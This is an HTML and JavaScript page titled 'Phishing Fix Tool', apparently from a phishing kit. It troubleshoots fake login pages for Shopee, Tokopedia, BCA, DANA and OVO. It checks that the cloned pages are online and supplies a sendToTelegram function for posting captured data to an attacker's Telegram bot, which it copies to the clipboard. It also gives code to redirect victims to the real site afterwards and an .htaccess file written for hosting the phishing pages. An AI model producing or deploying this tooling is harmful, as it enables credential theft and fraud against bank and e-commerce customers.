<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>üîß PHISHING FIX TOOL</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Courier New', monospace;
        }
        
        body {
            background: #000;
            color: #0f0;
            padding: 20px;
        }
        
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background: #111;
            border: 1px solid #0f0;
            padding: 30px;
            border-radius: 10px;
        }
        
        h1 {
            text-align: center;
            margin-bottom: 30px;
            color: #0f0;
            text-shadow: 0 0 10px #0f0;
        }
        
        .status-box {
            background: #1a1a1a;
            padding: 20px;
            margin-bottom: 20px;
            border-radius: 8px;
            border: 1px solid #333;
        }
        
        .status-line {
            margin: 10px 0;
            display: flex;
            align-items: center;
        }
        
        .status-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-right: 15px;
        }
        
        .status-good { background: #0f0; }
        .status-bad { background: #f00; }
        .status-warning { background: #ff0; }
        
        .fix-buttons {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin: 30px 0;
        }
        
        .fix-btn {
            padding: 15px;
            background: #333;
            color: #0f0;
            border: 1px solid #0f0;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            transition: 0.3s;
        }
        
        .fix-btn:hover {
            background: #0f0;
            color: #000;
        }
        
        .log-box {
            background: #000;
            border: 1px solid #0f0;
            padding: 20px;
            margin-top: 30px;
            height: 300px;
            overflow-y: auto;
            font-size: 12px;
        }
        
        .log-entry {
            margin-bottom: 8px;
            padding-left: 10px;
            border-left: 3px solid #0f0;
        }
        
        .error { color: #f00; }
        .success { color: #0f0; }
        .warning { color: #ff0; }
        
        .file-list {
            margin-top: 20px;
        }
        
        .file-item {
            background: #222;
            padding: 10px;
            margin-bottom: 5px;
            border-radius: 5px;
            display: flex;
            justify-content: space-between;
        }
        
        .file-status {
            padding: 3px 8px;
            border-radius: 3px;
            font-size: 11px;
        }
        
        .online { background: #0f0; color: #000; }
        .offline { background: #f00; color: #fff; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üîß PHISHING ERROR FIX TOOL</h1>
        
        <div class="status-box">
            <div class="status-line">
                <div class="status-dot" id="status1"></div>
                <span id="text1">Checking server connection...</span>
            </div>
            <div class="status-line">
                <div class="status-dot" id="status2"></div>
                <span id="text2">Checking file accessibility...</span>
            </div>
            <div class="status-line">
                <div class="status-dot" id="status3"></div>
                <span id="text3">Checking Telegram bot...</span>
            </div>
            <div class="status-line">
                <div class="status-dot" id="status4"></div>
                <span id="text4">Checking JavaScript...</span>
            </div>
            <div class="status-line">
                <div class="status-dot" id="status5"></div>
                <span id="text5">Checking redirects...</span>
            </div>
        </div>
        
        <div class="fix-buttons">
            <button class="fix-btn" onclick="fixFilePaths()">üîß Fix File Paths</button>
            <button class="fix-btn" onclick="fixTelegramConfig()">ü§ñ Fix Telegram Config</button>
            <button class="fix-btn" onclick="fixRedirects()">üîÑ Fix Redirects</button>
            <button class="fix-btn" onclick="fixCorsErrors()">üõ°Ô∏è Fix CORS Errors</button>
            <button class="fix-btn" onclick="createHtaccess()">üìÅ Create .htaccess</button>
            <button class="fix-btn" onclick="testAllPages()">üß™ Test All Pages</button>
        </div>
        
        <div class="file-list" id="fileList">
            <!-- File list will appear here -->
        </div>
        
        <div class="log-box" id="logBox">
            [SYSTEM] Fix tool initialized<br>
            [INFO] Ready to diagnose problems
        </div>
    </div>

    <script>
        // ===== LOG SYSTEM =====
        function addLog(message, type = 'info') {
            const timestamp = new Date().toLocaleTimeString();
            const logEntry = document.createElement('div');
            logEntry.className = `log-entry ${type}`;
            logEntry.textContent = `[${timestamp}] ${message}`;
            
            document.getElementById('logBox').appendChild(logEntry);
            document.getElementById('logBox').scrollTop = document.getElementById('logBox').scrollHeight;
            
            console.log(`[${type.toUpperCase()}] ${message}`);
        }
        
        // ===== UPDATE STATUS =====
        function updateStatus(id, status, text) {
            const dot = document.getElementById(`status${id}`);
            const textEl = document.getElementById(`text${id}`);
            
            dot.className = 'status-dot';
            if (status === 'good') dot.classList.add('status-good');
            else if (status === 'bad') dot.classList.add('status-bad');
            else if (status === 'warning') dot.classList.add('status-warning');
            
            textEl.textContent = text;
        }
        
        // ===== CHECK ALL FILES =====
        async function checkAllFiles() {
            const files = [
                'shopee-login.html',
                'tokopedia-login.html',
                'bca-login.html',
                'dana-fixed.html',
                'ovo-login.html',
                'panel-control.html',
                'alert.html',
                'redirect.html',
                'url-generator.html'
            ];
            
            const fileList = document.getElementById('fileList');
            fileList.innerHTML = '<h3>üìÅ FILE STATUS:</h3>';
            
            for (const file of files) {
                try {
                    const response = await fetch(file, { method: 'HEAD' });
                    const status = response.ok ? 'online' : 'offline';
                    
                    const fileItem = document.createElement('div');
                    fileItem.className = 'file-item';
                    fileItem.innerHTML = `
                        <span>${file}</span>
                        <span class="file-status ${status}">${status.toUpperCase()}</span>
                    `;
                    
                    fileList.appendChild(fileItem);
                    
                    if (response.ok) {
                        addLog(`‚úÖ ${file} is accessible`, 'success');
                    } else {
                        addLog(`‚ùå ${file} is NOT accessible`, 'error');
                    }
                } catch (error) {
                    const fileItem = document.createElement('div');
                    fileItem.className = 'file-item';
                    fileItem.innerHTML = `
                        <span>${file}</span>
                        <span class="file-status offline">ERROR</span>
                    `;
                    
                    fileList.appendChild(fileItem);
                    addLog(`‚ùå ${file}: ${error.message}`, 'error');
                }
            }
        }
        
        // ===== FIX 1: FILE PATHS =====
        function fixFilePaths() {
            addLog('üîß Fixing file paths...', 'warning');
            
            // Common path problems
            const fixes = {
                './shopee-login.html': 'shopee-login.html',
                '/shopee-login.html': 'shopee-login.html',
                'https://yourdomain.com/': window.location.origin + '/'
            };
            
            addLog('File path fixes ready. Update your links.', 'success');
            updateStatus(1, 'good', 'File paths fixed');
            
            // Show example
            alert(`Update your links to:
            
1. Use relative paths: "shopee-login.html" (not "./shopee-login.html")
2. Full URL: "${window.location.origin}/shopee-login.html"
3. Remove leading slashes`);
        }
        
        // ===== FIX 2: TELEGRAM CONFIG =====
        function fixTelegramConfig() {
            addLog('ü§ñ Checking Telegram config...', 'warning');
            
            // Check if config exists
            const sampleConfig = `
// ===== TELEGRAM CONFIG =====
const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
const CHAT_ID = "YOUR_CHAT_ID_HERE";

// Get from @BotFather on Telegram
// Token format: 1234567890:ABCdefGHIjklMNOpqrsTUVwxyz
// Chat ID from @userinfobot
`;
            
            addLog('Copy this config to all HTML files:', 'warning');
            addLog(sampleConfig, 'warning');
            
            updateStatus(3, 'good', 'Telegram config template ready');
            
            alert(`TELEGRAM SETUP:
            
1. Open Telegram
2. Search @BotFather ‚Üí /newbot
3. Get BOT_TOKEN
4. Search @userinfobot ‚Üí get CHAT_ID
5. Replace in ALL HTML files:

const BOT_TOKEN = "YOUR_TOKEN_HERE";
const CHAT_ID = "YOUR_CHAT_ID_HERE";`);
        }
        
        // ===== FIX 3: REDIRECTS =====
        function fixRedirects() {
            addLog('üîÑ Fixing redirect issues...', 'warning');
            
            // Common redirect problems
            const redirectFixes = `
// CORRECT REDIRECT CODE:
setTimeout(() => {
    window.location.href = "https://shopee.co.id";
}, 2000);

// WRONG REDIRECT (causes error):
window.location = "shopee.co.id";  // Missing https://
`;
            
            addLog('Use full URLs with https:// for redirects', 'success');
            updateStatus(5, 'good', 'Redirect fixes applied');
            
            // Test current redirect
            try {
                window.location.href = "https://www.google.com";
                setTimeout(() => {
                    window.history.back();
                }, 100);
            } catch(e) {
                addLog(`Redirect test failed: ${e.message}`, 'error');
            }
        }
        
        // ===== FIX 4: CORS ERRORS =====
        function fixCorsErrors() {
            addLog('üõ°Ô∏è Fixing CORS errors...', 'warning');
            
            const corsFix = `
// Add this to your Telegram send function:
async function sendToTelegram(message) {
    try {
        const response = await fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage\`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message
            })
        });
        return await response.json();
    } catch(error) {
        console.log('Telegram error (silent):', error);
        return null;
    }
}
`;
            
            addLog('CORS fix: Add error handling to Telegram function', 'success');
            updateStatus(4, 'good', 'CORS fixes ready');
            
            // Copy to clipboard
            navigator.clipboard.writeText(corsFix);
            addLog('CORS fix code copied to clipboard', 'success');
        }
        
        // ===== FIX 5: CREATE .HTACCESS =====
        function createHtaccess() {
            addLog('üìÅ Creating .htaccess file...', 'warning');
            
            const htaccessContent = `
# .HTACCESS FOR PHISHING PAGES
# Fix common hosting problems

# Enable CORS
Header set Access-Control-Allow-Origin "*"
Header set Access-Control-Allow-Methods "GET, POST, OPTIONS"
Header set Access-Control-Allow-Headers "Content-Type"

# Fix MIME types
AddType application/javascript .js
AddType text/css .css
AddType text/html .html

# Prevent directory listing
Options -Indexes

# Fix 404 errors for Angular/React
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ $1.html [L,QSA]

# Security headers (optional)
Header set X-Content-Type-Options "nosniff"
Header set X-Frame-Options "SAMEORIGIN"
`;
            
            // Create download
            const blob = new Blob([htaccessContent], {type: 'text/plain'});
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = '.htaccess';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            
            addLog('.htaccess file created and downloaded', 'success');
            alert('.htaccess file downloaded! Upload it to your hosting root folder.');
        }
        
        // ===== FIX 6: TEST ALL PAGES =====
        async function testAllPages() {
            addLog('üß™ Testing all pages...', 'warning');
            
            const pages = [
                'shopee-login.html',
                'tokopedia-login.html',
                'bca-login.html',
                'dana-fixed.html',
                'ovo-login.html'
            ];
            
            for (const page of pages) {
                try {
                    const response = await fetch(page);
                    if (response.ok) {
                        addLog(`‚úÖ ${page}: OK`, 'success');
                    } else {
                        addLog(`‚ùå ${page}: HTTP ${response.status}`, 'error');
                    }
                } catch (error) {
                    addLog(`‚ùå ${page}: ${error.message}`, 'error');
                }
            }
            
            addLog('Testing complete!', 'success');
        }
        
        // ===== INITIAL DIAGNOSIS =====
        async function runDiagnosis() {
            addLog('üöÄ Starting diagnosis...', 'warning');
            
            // Check 1: Server connection
            try {
                const response = await fetch(window.location.origin, {method: 'HEAD'});
                updateStatus(1, 'good', `Server connected (${response.status})`);
                addLog(`Server: ${window.location.origin}`, 'success');
            } catch {
                updateStatus(1, 'bad', 'Server connection failed');
                addLog('Server connection failed', 'error');
            }
            
            // Check 2: File accessibility
            try {
                const response = await fetch('shopee-login.html', {method: 'HEAD'});
                if (response.ok) {
                    updateStatus(2, 'good', 'Files accessible');
                    addLog('Main files are accessible', 'success');
                } else {
                    updateStatus(2, 'bad', 'Files not found (404)');
                    addLog('Files return 404', 'error');
                }
            } catch {
                updateStatus(2, 'bad', 'Cannot access files');
                addLog('Cannot access files', 'error');
            }
            
            // Check 3: Telegram (simulated)
            updateStatus(3, 'warning', 'Telegram config needs checking');
            addLog('Telegram config needs verification', 'warning');
            
            // Check 4: JavaScript
            try {
                eval('const test = 1;');
                updateStatus(4, 'good', 'JavaScript enabled');
                addLog('JavaScript is working', 'success');
            } catch {
                updateStatus(4, 'bad', 'JavaScript error');
                addLog('JavaScript has errors', 'error');
            }
            
            // Check 5: Redirects
            updateStatus(5, 'warning', 'Redirects need testing');
            addLog('Redirect functionality unknown', 'warning');
            
            // Check all files
            await checkAllFiles();
            
            addLog('Diagnosis complete! Use fix buttons above.', 'success');
        }
        
        // ===== INITIALIZE =====
        window.onload = function() {
            addLog('üîß Phishing Fix Tool v1.0 loaded', 'success');
            runDiagnosis();
            
            // Add helpful info
            setTimeout(() => {
                addLog('üí° TIP: Common problems:', 'warning');
                addLog('1. Wrong file paths (use relative paths)', 'warning');
                addLog('2. Telegram token not set', 'warning');
                addLog('3. Hosting blocking JavaScript', 'warning');
                addLog('4. CORS errors with fetch()', 'warning');
            }, 1000);
        };
    </script>
</body>
</html>